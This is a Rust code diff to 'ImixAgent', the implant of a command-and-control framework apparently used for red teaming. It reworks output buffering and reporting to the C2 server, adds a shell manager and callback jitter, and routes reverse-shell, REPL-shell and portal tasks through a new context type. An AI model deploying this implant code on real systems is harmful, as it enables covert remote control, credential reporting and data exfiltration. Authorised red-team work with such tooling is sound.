@@ -1,17 +1,26 @@
-use anyhow::{Context, Result};
+use anyhow::{Context as AnyhowContext, Result};
 use eldritch::agent::agent::Agent;
+use eldritch_agent::Context;
 use pb::c2::host::Platform;
 use pb::c2::transport::Type;
-use pb::c2::{self, ClaimTasksRequest, TaskContext};
+use pb::c2::{
+    self, ClaimTasksRequest, ReportOutputRequest, ReportShellTaskOutputMessage,
+    ReportTaskOutputMessage, ShellTaskContext, ShellTaskOutput, TaskContext, TaskOutput,
+    report_output_request,
+};
 use pb::config::Config;
 use std::collections::{BTreeMap, BTreeSet};
 use std::sync::{Arc, Mutex};
+use std::time::Duration;
 use tokio::sync::RwLock;
 use transport::Transport;
 
 use crate::portal::run_create_portal;
+use crate::shell::manager::{ShellManager, ShellManagerMessage};
 use crate::shell::{run_repl_reverse_shell, run_reverse_shell_pty};
 use crate::task::TaskRegistry;
+
+const MAX_BUF_OUTPUT_MESSAGES: usize = 65535;
 
 #[derive(Clone)]
 pub struct ImixAgent<T: Transport> {
@@ -20,7 +29,9 @@ pub struct ImixAgent<T: Transport> {
     runtime_handle: tokio::runtime::Handle,
     pub task_registry: Arc<TaskRegistry>,
     pub subtasks: Arc<Mutex<BTreeMap<i64, tokio::task::JoinHandle<()>>>>,
-    pub output_buffer: Arc<Mutex<Vec<c2::ReportTaskOutputRequest>>>,
+    pub output_tx: std::sync::mpsc::SyncSender<c2::ReportOutputRequest>,
+    pub output_rx: Arc<Mutex<std::sync::mpsc::Receiver<c2::ReportOutputRequest>>>,
+    pub shell_manager_tx: tokio::sync::mpsc::Sender<ShellManagerMessage>,
 }
 
 impl<T: Transport + Sync + 'static> ImixAgent<T> {
@@ -29,15 +40,24 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
         transport: T,
         runtime_handle: tokio::runtime::Handle,
         task_registry: Arc<TaskRegistry>,
+        shell_manager_tx: tokio::sync::mpsc::Sender<ShellManagerMessage>,
     ) -> Self {
+        let (output_tx, output_rx) = std::sync::mpsc::sync_channel(MAX_BUF_OUTPUT_MESSAGES);
+
         Self {
             config: Arc::new(RwLock::new(config)),
             transport: Arc::new(RwLock::new(transport)),
             runtime_handle,
             task_registry,
             subtasks: Arc::new(Mutex::new(BTreeMap::new())),
-            output_buffer: Arc::new(Mutex::new(Vec::new())),
+            output_tx,
+            output_rx: Arc::new(Mutex::new(output_rx)),
+            shell_manager_tx,
         }
+    }
+
+    pub fn start_shell_manager(self: Arc<Self>, manager: ShellManager<T>) {
+        self.runtime_handle.spawn(manager.run());
     }
 
     pub fn get_callback_interval_u64(&self) -> Result<u64> {
@@ -67,6 +87,33 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
         Ok(interval)
     }
 
+    pub fn get_callback_jitter(&self) -> Result<f32> {
+        // Blocks on read, but it's fast
+        let cfg = self
+            .config
+            .try_read()
+            .map_err(|_| anyhow::anyhow!("Failed to acquire read lock on config"))?;
+        let info = cfg
+            .info
+            .as_ref()
+            .ok_or_else(|| anyhow::anyhow!("No beacon info in config"))?;
+
+        let available_transports = info
+            .available_transports
+            .as_ref()
+            .ok_or_else(|| anyhow::anyhow!("no available transports set"))?;
+
+        let active_idx = available_transports.active_index as usize;
+        let jitter = available_transports
+            .transports
+            .get(active_idx)
+            .or_else(|| available_transports.transports.first())
+            .ok_or_else(|| anyhow::anyhow!("no transports configured"))?
+            .jitter;
+
+        Ok(jitter)
+    }
+
     // Triggers config.refresh_primary_ip() in a write lock
     pub async fn refresh_ip(&self) {
         let mut cfg = self.config.write().await;
@@ -81,16 +128,15 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
 
     // Flushes all buffered task outputs using the provided transport
     pub async fn flush_outputs(&self) {
-        // Wait a short delay to allow tasks to produce output
-        tokio::time::sleep(std::time::Duration::from_millis(100)).await;
-
-        // Drain the buffer
-        let outputs: Vec<_> = {
-            match self.output_buffer.lock() {
-                Ok(mut b) => b.drain(..).collect(),
-                Err(_) => return,
-            }
+        let rx = match self.output_rx.lock() {
+            Ok(rx) => rx,
+            Err(_) => return,
         };
+
+        let mut outputs = Vec::new();
+        while let Ok(msg) = rx.recv_timeout(Duration::from_millis(10)) {
+            outputs.push(msg);
+        }
 
         #[cfg(debug_assertions)]
         log::info!("Flushing {} task outputs", outputs.len());
@@ -99,14 +145,101 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
             return;
         }
 
-        let mut transport = self.transport.write().await;
+        let mut merged_task_outputs: BTreeMap<i64, (TaskContext, TaskOutput)> = BTreeMap::new();
+        let mut merged_shell_outputs: BTreeMap<i64, (ShellTaskContext, ShellTaskOutput)> =
+            BTreeMap::new();
+
         for output in outputs {
+            if let Some(msg) = output.message {
+                match msg {
+                    report_output_request::Message::TaskOutput(m) => {
+                        if let (Some(ctx), Some(new_out)) = (m.context, m.output) {
+                            let task_id = ctx.task_id;
+                            use std::collections::btree_map::Entry;
+                            match merged_task_outputs.entry(task_id) {
+                                Entry::Occupied(mut entry) => {
+                                    let (_, existing_out) = entry.get_mut();
+                                    existing_out.output.push_str(&new_out.output);
+                                    match (&mut existing_out.error, &new_out.error) {
+                                        (Some(e1), Some(e2)) => e1.msg.push_str(&e2.msg),
+                                        (None, Some(e2)) => existing_out.error = Some(e2.clone()),
+                                        _ => {}
+                                    }
+                                    if new_out.exec_finished_at.is_some() {
+                                        existing_out.exec_finished_at =
+                                            new_out.exec_finished_at.clone();
+                                    }
+                                }
+                                Entry::Vacant(entry) => {
+                                    entry.insert((ctx, new_out));
+                                }
+                            }
+                        }
+                    }
+                    report_output_request::Message::ShellTaskOutput(m) => {
+                        if let (Some(ctx), Some(new_shell_out)) = (m.context, m.output) {
+                            let shell_task_id = ctx.shell_task_id;
+                            use std::collections::btree_map::Entry;
+                            match merged_shell_outputs.entry(shell_task_id) {
+                                Entry::Occupied(mut entry) => {
+                                    let (_, existing_out) = entry.get_mut();
+                                    existing_out.output.push_str(&new_shell_out.output);
+                                    match (&mut existing_out.error, &new_shell_out.error) {
+                                        (Some(e1), Some(e2)) => e1.msg.push_str(&e2.msg),
+                                        (None, Some(e2)) => existing_out.error = Some(e2.clone()),
+                                        _ => {}
+                                    }
+                                    if new_shell_out.exec_finished_at.is_some() {
+                                        existing_out.exec_finished_at =
+                                            new_shell_out.exec_finished_at.clone();
+                                    }
+                                }
+                                Entry::Vacant(entry) => {
+                                    entry.insert((ctx, new_shell_out));
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        let mut transport = self.transport.write().await;
+        for (_, (ctx, output)) in merged_task_outputs {
             #[cfg(debug_assertions)]
             log::info!("Task Output: {output:#?}");
 
-            if let Err(_e) = transport.report_task_output(output).await {
+            let req = ReportOutputRequest {
+                message: Some(report_output_request::Message::TaskOutput(
+                    ReportTaskOutputMessage {
+                        context: Some(ctx),
+                        output: Some(output),
+                    },
+                )),
+            };
+
+            if let Err(_e) = transport.report_output(req).await {
                 #[cfg(debug_assertions)]
                 log::error!("Failed to report task output: {_e}");
+            }
+        }
+
+        for (_, (ctx, output)) in merged_shell_outputs {
+            #[cfg(debug_assertions)]
+            log::info!("Shell Task Output: {output:#?}");
+
+            let req = ReportOutputRequest {
+                message: Some(report_output_request::Message::ShellTaskOutput(
+                    ReportShellTaskOutputMessage {
+                        context: Some(ctx),
+                        output: Some(output),
+                    },
+                )),
+            };
+
+            if let Err(_e) = transport.report_output(req).await {
+                #[cfg(debug_assertions)]
+                log::error!("Failed to report shell task output: {_e}");
             }
         }
     }
@@ -153,7 +286,7 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
     }
 
     // Helper to claim tasks and return them, so main can spawn
-    pub async fn claim_tasks(&self) -> Result<Vec<pb::c2::Task>> {
+    pub async fn claim_tasks(&self) -> Result<c2::ClaimTasksResponse> {
         let mut transport = self.transport.write().await;
         let beacon_info = self.config.read().await.info.clone();
         let req = ClaimTasksRequest {
@@ -163,23 +296,39 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
             .claim_tasks(req)
             .await
             .context("Failed to claim tasks")?;
-        Ok(response.tasks)
+        Ok(response)
     }
 
     pub async fn process_job_request(&self) -> Result<()> {
-        let tasks = self.claim_tasks().await?;
-        if tasks.is_empty() {
+        let resp = self.claim_tasks().await?;
+
+        let mut has_work = false;
+
+        if !resp.tasks.is_empty() {
+            has_work = true;
+            let registry = self.task_registry.clone();
+            let agent = Arc::new(self.clone());
+            for task in resp.tasks {
+                #[cfg(debug_assertions)]
+                log::info!("Claimed task {}: JWT={}", task.id, task.jwt);
+
+                registry.spawn(task, agent.clone());
+            }
+        }
+
+        if !resp.shell_tasks.is_empty() {
+            has_work = true;
+            for shell_task in resp.shell_tasks {
+                let _ = self
+                    .shell_manager_tx
+                    .try_send(ShellManagerMessage::ProcessTask(shell_task));
+            }
+        }
+
+        if !has_work {
             return Ok(());
         }
 
-        let registry = self.task_registry.clone();
-        let agent = Arc::new(self.clone());
-        for task in tasks {
-            #[cfg(debug_assertions)]
-            log::info!("Claimed task {}: JWT={}", task.id, task.jwt);
-
-            registry.spawn(task, agent.clone());
-        }
         Ok(())
     }
 
@@ -262,14 +411,11 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         self.with_transport(|mut t| async move { t.report_credential(req).await })
     }
 
-    fn report_file(&self, req: c2::ReportFileRequest) -> Result<c2::ReportFileResponse, String> {
-        self.with_transport(|mut t| async move {
-            // Transport uses std::sync::mpsc::Receiver for report_file
-            let (tx, rx) = std::sync::mpsc::channel();
-            tx.send(req)?;
-            drop(tx);
-            t.report_file(rx).await
-        })
+    fn report_file(
+        &self,
+        req: std::sync::mpsc::Receiver<c2::ReportFileRequest>,
+    ) -> Result<c2::ReportFileResponse, String> {
+        self.with_transport(|mut t| async move { t.report_file(req).await })
     }
 
     fn report_process_list(
@@ -279,36 +425,46 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         self.with_transport(|mut t| async move { t.report_process_list(req).await })
     }
 
-    fn report_task_output(
+    fn report_output(
         &self,
-        req: c2::ReportTaskOutputRequest,
-    ) -> Result<c2::ReportTaskOutputResponse, String> {
+        req: c2::ReportOutputRequest,
+    ) -> Result<c2::ReportOutputResponse, String> {
         // Buffer output instead of sending immediately
-        let mut buffer = self.output_buffer.lock().map_err(|e| e.to_string())?;
-        buffer.push(req);
-        Ok(c2::ReportTaskOutputResponse {})
+        self.output_tx
+            .try_send(req)
+            .map_err(|_| "Output buffer full".to_string())?;
+        Ok(c2::ReportOutputResponse {})
     }
 
-    fn start_reverse_shell(
-        &self,
-        task_context: TaskContext,
-        cmd: Option<String>,
-    ) -> Result<(), String> {
-        self.spawn_subtask(task_context.task_id, move |transport| async move {
-            run_reverse_shell_pty(task_context, cmd, transport).await
+    fn start_reverse_shell(&self, context: Context, cmd: Option<String>) -> Result<(), String> {
+        let id = match &context {
+            Context::Task(tc) => tc.task_id,
+            Context::ShellTask(stc) => stc.shell_task_id,
+        };
+        self.spawn_subtask(id, move |transport| async move {
+            run_reverse_shell_pty(context, cmd, transport).await
         })
     }
 
-    fn create_portal(&self, task_context: TaskContext) -> Result<(), String> {
-        self.spawn_subtask(task_context.task_id, move |transport| async move {
-            run_create_portal(task_context, transport).await
+    fn create_portal(&self, context: Context) -> Result<(), String> {
+        let shell_manager_tx = self.shell_manager_tx.clone();
+        let id = match &context {
+            Context::Task(tc) => tc.task_id,
+            Context::ShellTask(stc) => stc.shell_task_id,
+        };
+        self.spawn_subtask(id, move |transport| async move {
+            run_create_portal(context, transport, shell_manager_tx).await
         })
     }
 
-    fn start_repl_reverse_shell(&self, task_context: TaskContext) -> Result<(), String> {
+    fn start_repl_reverse_shell(&self, context: Context) -> Result<(), String> {
         let agent = self.clone();
-        self.spawn_subtask(task_context.task_id, move |transport| async move {
-            run_repl_reverse_shell(task_context, transport, agent).await
+        let id = match &context {
+            Context::Task(tc) => tc.task_id,
+            Context::ShellTask(stc) => stc.shell_task_id,
+        };
+        self.spawn_subtask(id, move |transport| async move {
+            run_repl_reverse_shell(context, transport, agent).await
         })
     }
 
@@ -426,6 +582,7 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
                         interval: current_transport.interval,
                         r#type: current_transport.r#type,
                         extra: current_transport.extra.clone(),
+                        jitter: current_transport.jitter,
                     };
 
                     // Append the new transport and update active_index
@@ -495,6 +652,7 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
                             interval: tmpl.interval,
                             r#type: tmpl.r#type,
                             extra: tmpl.extra,
+                            jitter: tmpl.jitter,
                         };
                         available_transports.transports.push(new_transport);
                         available_transports.active_index =
@@ -573,6 +731,7 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
                             interval: 5,
                             r#type: 0,
                             extra: String::new(),
+                            jitter: 0.0,
                         });
 
                     let new_transport = pb::c2::Transport {
@@ -580,6 +739,7 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
                         interval: template.interval,
                         r#type: template.r#type,
                         extra: template.extra,
+                        jitter: template.jitter,
                     };
                     available_transports.transports.push(new_transport);
                 }
